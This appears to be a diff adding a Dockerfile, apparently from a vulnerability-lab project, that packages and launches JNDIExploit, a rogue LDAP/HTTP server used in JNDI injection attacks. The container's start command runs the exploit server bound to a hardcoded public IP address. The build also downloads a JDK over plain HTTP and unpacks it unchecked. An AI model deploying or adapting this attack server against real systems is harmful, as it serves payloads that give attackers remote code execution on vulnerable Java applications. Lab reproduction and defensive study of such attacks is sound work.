@@ -1,0 +1,21 @@
+FROM buildpack-deps:stretch-curl
+
+LABEL maintainer="phithon <root@leavesongs.com>"
+
+ENV FILENAME="jdk-8u20-linux-x64.tar.gz" JAVA_HOME="/opt/jdk"
+RUN mkdir /jndiexploit
+COPY JNDIExploit-1.2-SNAPSHOT.jar /jndiexploit
+COPY ./lib /jndiexploit/lib
+RUN set -ex \
+    && mkdir -p ${JAVA_HOME} \
+    && cd ${JAVA_HOME} \
+    && wget -qO- http://api.vulhub.org/download/jdk/8/${FILENAME} | tar xz --strip-components=1 \
+    && update-alternatives --install /usr/bin/java java /opt/jdk/bin/java 100 \
+    && update-alternatives --install /usr/bin/javac javac /opt/jdk/bin/javac 100
+
+ENV LDAP_PORT=1389
+ENV HTTP_PORT=80
+
+WORKDIR /jndiexploit
+
+CMD ["/bin/bash" "-c" "java -jar ./JNDIExploit-1.2-SNAPSHOT.jar --ip 139.155.81.10 --ldapPort \"${LDAP_PORT}\" --httpPort \"${HTTP_PORT}\""]
